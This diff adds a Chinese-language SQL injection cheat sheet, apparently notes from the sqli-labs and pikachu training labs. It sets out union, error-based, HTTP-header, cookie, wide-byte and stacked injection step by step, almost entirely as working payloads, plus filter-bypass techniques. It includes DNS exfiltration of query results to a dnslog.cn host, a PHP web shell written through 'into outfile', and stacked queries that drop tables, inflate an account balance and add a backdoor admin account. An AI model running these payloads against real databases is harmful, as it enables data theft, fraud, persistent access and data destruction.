@@ -1,0 +1,566 @@
+一、Union Select注入
+
+目标：通过union联合查询获取数据库数据
+
+注入前提：
+页面显示正常用户信息，同时存在报错位和错误回显
+
+步骤1 判断闭合方式
+输入测试参数：2\
+观察报错信息，提取闭合符号
+常见闭合：单引号 双引号 单引号加括号等
+
+步骤2 验证闭合
+构造：2' --+ 
+若正常返回，则闭合方式为单引号
+
+步骤3 确定列数
+使用order by猜测
+2' order by 10 --+
+逐次减少直到正常返回
+得到正确列数，假设为3
+
+步骤4 找到显示位
+让前半句查询为空，使用union select
+构造：-2' union select 1,2,3 --+
+页面上显示数字的位置即为显示位，假设2和3可显示
+
+步骤5 查数据库名
+-2' union select 1,database(),3 --+
+替换database()可查version() user() @@datadir等
+
+步骤6 查表名
+查指定库下的所有表
+-2' union select 1,group_concat(table_name),3 
+from information_schema.tables 
+where table_schema='security' --+
+
+步骤7 查列名
+查指定表下的所有列
+-2' union select 1,group_concat(column_name),3 
+from information_schema.columns 
+where table_schema='security' and table_name='users' --+
+
+步骤8 查数据
+从目标表获取数据
+-2' union select 1,group_concat(username),group_concat(password) 
+from users --+
+
+常用辅助命令
+登录数据库：mysql -u用户名 -p密码
+查看所有库：show databases;
+切换库：use 库名;
+查看表：show tables;
+查表数据：select * from 表名;
+
+MySQL注释符
+--空格
+--+
+#
+/**/
+
+转义字符\：将其后第一个字符转为普通字符串
+
+get类型注入点在参数中：?id=值
+
+==========================================================================================================
+
+二、报错注入
+
+适用条件：
+页面不显示正常查询结果，但会显示数据库报错信息
+
+核心思路：
+构造SQL语句，利用函数执行错误，将查询结果带出到报错信息中
+
+步骤一 确定闭合方式
+输入测试参数：2\
+根据报错信息判断闭合符号
+
+步骤二 使用报错注入语句
+基础格式：
+?id=闭合符 and (select 1 from (select count(*),concat(报错内容,floor(rand()*2))a from information_schema.tables group by a)b) --+
+
+查数据库名
+?id=2' and (select 1 from (select count(*),concat(0x3a,(select database()),0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+
+查表名（security库）
+?id=2' and (select 1 from (select count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+
+查列名
+替换子查询为：
+select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
+
+查数据
+替换子查询为：
+select username from users limit 0,1
+
+语句分层构造法
+第一层：?id=1' and () --+
+第二层：?id=1' and (select 1 from ()b) --+
+第三层：?id=1' and (select 1 from (select count(*),concat()a from information_schema.tables group by a)b) --+
+第四层：填入concat具体内容
+
+其他报错注入函数
+
+extractvalue
+?id=1' and extractvalue(1,concat(0x7e,(database()),0x7e)) --+
+
+updatexml
+?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1) --+
+
+十六进制符号对照
+0x7e 对应 ~
+0x3a 对应 :
+
+concat示例
+select concat(0x3a,0x3a,(select database()),0x3a,0x3a) as a;
+结果：::库名::
+
+辅助函数说明
+rand() 返回0到1之间的随机数
+floor(rand()*2) 返回0或1
+count(*) 统计行数
+group by 按指定列分组
+
+报错原理
+rand()在select和group by中可能计算出不同值，导致分组冲突，mysql抛出重复行错误，但错误中会显示concat拼接的内容
+
+====================================================================================================
+
+三、DNS盲注
+适用于盲注，因为页面不显示报错信息，就借助这个网站查看select的语句查询结果
+要用到select 的load_file
+1.配置文件：
+Extensions的Mysql里my.ini文件
+查找：secure_file_priv=
+如果找不到，就添加在mysqld的最后一行
+重启mysql
+
+2.获取一个域名
+http://dnslog.cn
+
+3.在进行盲注的地址栏输入：
+?name=1' and if((select load_file(concat('\\\\',(select database()),'.jftaso.dnslog.cn\\fffd'))),1,0) --+
+注意：域名\sdsj，要加点东西糊弄一下，并且每次请求要修改，因为dns缓存
+
+?name=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=0x70696b61636875 limit 0,1),'.jftaso.dnslog.cn\\fxxxfd'))),1,0) --+
+
+在http://dnslog.cn里就可以看到库名，表名等信息了
+
+原理：把select database()的结果（pikachu）合着自己的域名.jftaso.dnslog.cn（pikachu.jftaso.dnslog.cn），使用load_file()进行网址请求，
+请求信息就会被jftaso.dnslog.cn的dns服务器抓到
+
+===========================================================================================================
+
+四、HTTP头注入
+
+适用场景：
+网页会记录用户的HTTP头部信息，如User-Agent、Referer等，并存入数据库
+
+Less-18 User-Agent注入
+
+步骤1 理解SQL语句结构
+后台可能执行类似语句：
+insert into security.uagent(uagent, ipadd, username) values('浏览器信息', 'IP地址', '用户名')
+
+步骤2 确定闭合方式
+使用反斜杠测试：' \
+通过报错判断单引号闭合
+
+步骤3 构造报错注入payload
+使用BurpSuite抓取登录请求
+用户名密码输入正确，如admin/admin
+修改User-Agent头为：
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
+
+最终拼接效果：
+insert into security.uagent(uagent, ipadd, username) values('' and 报错语句 and '1'='1', 'IP', '用户名')
+
+Less-19 Referer注入
+
+与User-Agent类似
+修改Referer头为：
+' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1
+
+报错注入payload扩展
+查表名
+' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)) and '1'='1
+
+查列名
+' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e)) and '1'='1
+
+查数据
+' and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) and '1'='1
+
+小知识
+Referer含义：来源页面，记录用户从哪个网站跳转过来
+常见应用：直播带货渠道统计、流量来源分析
+
+注意事项
+必须使用正确的用户名密码登录，保证insert语句正常执行
+注入点在HTTP头中，需要抓包修改
+and '1'='1 用于保持语句逻辑完整，不影响原有条件
+
+=================================================================================================================
+
+五、Cookie注入流程
+
+适用场景：
+用户登录后，系统将登录信息存储在cookie中，后续请求通过cookie识别身份
+
+Less-20 明文Cookie注入
+
+步骤1 登录后抓包
+登录成功，刷新页面时抓取请求
+修改cookie中uname=后面的值
+
+步骤2 判断闭合方式
+输入：\
+报错显示单引号闭合
+
+步骤3 执行报错注入
+Cookie设置为：
+uname=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
+
+注意：cookie注入使用#作为注释，如果无效可换成 and '1'='1
+
+完整示例：
+uname=admin' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)) #
+
+Less-21 Base64加密Cookie注入
+
+特征：
+页面显示：YOUR COOKIE : uname = YWRtaW4=
+YWRtaW4= 是 admin 的base64编码
+
+步骤1 加解密方法
+BurpSuite中右键 -> Convert selection -> base64 -> decode/encode
+Firefox浏览器自带base64加解密功能
+
+步骤2 判断闭合方式
+原始payload：\
+base64编码后：XA==
+发送后根据报错判断闭合方式为')
+
+步骤3 构造注入payload
+原始语句：') and extractvalue(1,concat(0x7e,(select database()),0x7e)) #
+base64编码：
+JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpICM=
+
+Cookie设置：
+uname=编码后的字符串
+
+Less-22
+类似，闭合方式为"，需对应处理
+
+核心原理
+越权漏洞：修改cookie值可能伪造其他用户身份
+登录后cookie被系统信任，注入点更隐蔽
+
+操作要点
+登录成功后抓取任意请求
+修改cookie参数值
+加密的需先编码再发送
+注释符常用#或--+
+
+=================================================================================================================
+
+六、宽字节注入
+
+适用场景：
+程序对输入的单引号自动添加反斜杠进行转义，即'变为\'
+
+核心原理：
+数据库使用GBK编码时，认为两个字节组成一个汉字
+反斜杠%5c与特定字符组合会被解析为汉字，从而吃掉反斜杠
+
+关键字符：
+%df + %5c = 一个汉字
+其他可用字符：%bf %aa %af %da
+
+GET型宽字节注入
+
+步骤1 原始情况
+输入：'
+被转义为：\'
+url编码：%5c%27
+
+步骤2 构造payload
+输入：%df'
+url编码：%df%27
+实际解析：%df%5c%27
+%df%5c被识别为一个汉字，剩下%27单独作为单引号
+
+注入示例：
+?id=-1%df' union select 1,2,3 --+
+
+查表名：
+?id=-1%df' union select 1,(select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),3 --+
+
+0x7365637572697479是security的十六进制，用于绕过引号限制
+
+POST型宽字节注入
+
+步骤1 抓包
+BurpSuite捕获POST请求
+
+步骤2 构造payload
+在参数值中输入：admin%df%27 union select 1,2 #
+
+步骤3 URL解码
+选中%df%27部分
+右键 -> Convert selection -> url -> decode
+POST不会自动解码，需要手动处理
+
+在线编码工具：
+https://encoder.mattiasgeniar.be/index.php
+
+原理图示
+原始：' 
+转义后：\'
+url：%5c%27
+
+加入%df：
+%df%5c%27
+%df%5c = 汉字（吃掉反斜杠）
+剩余：%27 = '（成功闭合）
+
+注意事项
+GET请求自动url解码，POST需手动解码
+表名和库名可用十六进制表示避免引号
+确保数据库编码为GBK系列
+
+
+
+================================================================================================================
+
+七、堆叠注入
+
+适用场景：
+可以同时执行多条SQL语句
+
+核心原理：
+使用分号结束第一条语句，后面添加任意SQL语句
+
+基本格式：
+原始语句 + 闭合符 + ; + 第二条语句 + 注释符
+
+注入示例：
+?id=2';insert into users(id,username,password) values(99,'zhangsan','p-0p-0') --+
+
+执行效果：
+第一条：select ... where id=2
+第二条：insert into users values(...)
+
+完整步骤
+
+步骤1 判断闭合方式
+输入：2\
+根据报错确定闭合符，假设为单引号
+
+步骤2 构造堆叠payload
+?id=2';drop table test --+
+?id=2';update users set password='123' where id=1 --+
+?id=2';delete from users where id=99 --+
+
+步骤3 常用堆叠语句
+添加用户
+insert into users(id,username,password) values(100,'lisi','123456')
+
+修改数据
+update users set money=1000000 where id=1
+
+删除数据
+delete from users where id=100
+
+创建表
+create table test(id int)
+
+删除表
+drop table test
+
+执行系统命令（需特定条件）
+select '<?php system($_GET[cmd]);?>' into outfile '/var/www/shell.php'
+
+实际应用场景
+
+金融系统漏洞：
+发现某个参数存在堆叠注入
+?id=1';update accounts set balance=1000000 where username='target' --+
+提现操作
+
+权限维持：
+添加后门管理员账户
+?id=1';insert into admin(username,password) values('hacker','md5(123456)') --+
+
+注意事项
+堆叠注入依赖数据库驱动支持
+MySQL基本支持，其他数据库需测试
+第二条语句不受原查询影响
+注释符必须正确闭合，防止多余语句干扰
+
+
+================================================================================================================
+
+八、关键字过滤
+
+1.OR / AND 过滤
+
+过滤情况：大小写敏感
+绕过示例：Or、oR、OR、oR
+
+过滤情况：简单替换为空（一次）
+绕过示例：双写 → oorr 剩 or；anandd 剩 and
+
+过滤情况：正则匹配 \bOR\b
+绕过示例：O/**/R（内联注释）、O%52（URL编码）、O!R（MySQL特殊语法）
+
+过滤情况：完全禁止逻辑词
+绕过示例：|| 代替 OR（部分DB）、&& 代替 AND；或用 ^（异或）、= 直接构造永真
+
+过滤情况：绕过永真条件
+绕过示例：不用 OR 1=1，改用 '='（如 admin'=' 需测试）、' or 1 简写
+
+2.空格过滤（最常见）
+
+过滤情况：禁止空格
+绕过方法：
+
+    注释 /**/
+
+    换行 %0a 或 %0d
+
+    制表符 %09
+
+    垂直制表 %0b
+
+    回车 %0d
+
+    括号包裹：(select*from...)
+
+    特殊字符：%a0、%c0（需编码）
+
+示例：
+select/**/*/**/from/**/users
+select%0a*%0afrom%0ausers
+
+3.引号过滤（单引号 ' / 双引号 "）
+
+过滤情况：单引号被转义或过滤
+绕过方法：
+
+    宽字节注入（GBK等）：%df%27 变 運'
+
+    不依赖引号：数字型注入 id=1 and 1=1
+
+    十六进制字符串：username=0x61646D696E（admin）
+
+    无引号闭合：username=admin 直接比较（若后端允许）
+
+过滤情况：双引号被过滤
+绕过方法：改用单引号或十六进制
+
+4.等号 = 过滤
+
+过滤情况：= 被拦截
+绕过方法：
+
+    LIKE：id like 1
+
+    IN：id in (1)
+
+    BETWEEN：id between 1 and 1
+
+    <> 或 >、< 组合：id > 0 and id < 2
+
+    字符串比较：username='admin' 改为 username<='admin' and username>='admin'
+
+    使用 REGEXP、RLIKE
+
+5.逗号 , 过滤
+
+过滤情况：禁止逗号
+绕过方法：
+
+    子查询代替 LIMIT：LIMIT 1 offset 0 代替 LIMIT 0,1
+
+    JOIN 替代多个列：select a from t1 join t2
+
+    盲注中用 CASE WHEN 或 SUBSTR(str FROM pos FOR len)
+
+示例：
+SUBSTR('abc' FROM 1 FOR 1) 代替 SUBSTR('abc',1,1)
+
+6.注释符过滤（--、#、/*）
+
+过滤情况：-- 被过滤
+绕过方法：
+
+    使用 #（MySQL）
+
+    使用 ;%00（空字节截断）
+
+    不依赖注释：直接闭合语句，如 admin' and '1'='1
+
+    使用 /*!50000 ... */（MySQL特殊注释）
+
+过滤情况：多行注释 /* 被过滤
+绕过方法：改用 -- 或 #，或利用换行结束语句
+
+7.函数名过滤（如 DATABASE()、USER()、SUBSTR()）
+
+过滤情况：函数名被拦截
+绕过方法：
+
+    内联注释：DATABASE/**/()
+
+    大小写：database()、DataBase()
+
+    双写：databasdatabase（若替换为空）
+
+    等价函数：SUBSTR → MID、SUBSTRING；ASCII → ORD、CONV
+
+过滤情况：括号被过滤
+绕过方法：
+
+    用数字运算代替函数（复杂）
+
+    盲注中用 LIKE 逐字符测试
+
+8.数字型注入中的运算符过滤（>、<）
+
+过滤情况：>、< 被拦截
+绕过方法：
+
+    BETWEEN ... AND ...
+
+    GREATEST()、LEAST()
+
+    IN 结合子查询
+
+    用 NOT 组合：id != 1 代替 id > 0
+
+9.堆叠查询过滤（分号 ;）
+
+过滤情况：分号被过滤
+绕过方法：
+
+    使用 %3b（URL编码）
+
+    利用注释结束语句：select 1;--，若无分号可尝试换行 %0a
+
+    依赖联合查询 UNION 而非堆叠
+
+10.联合查询 UNION 过滤
+
+过滤情况：UNION 被拦截
+绕过方法：
+
+    大小写、双写、注释插入（同 OR）
+
+    使用 UNION ALL 或 UNION DISTINCT
+
+    改用子查询：select (select column from table limit 1)
+
+    报错注入、布尔盲注、时间盲注代替联合查询
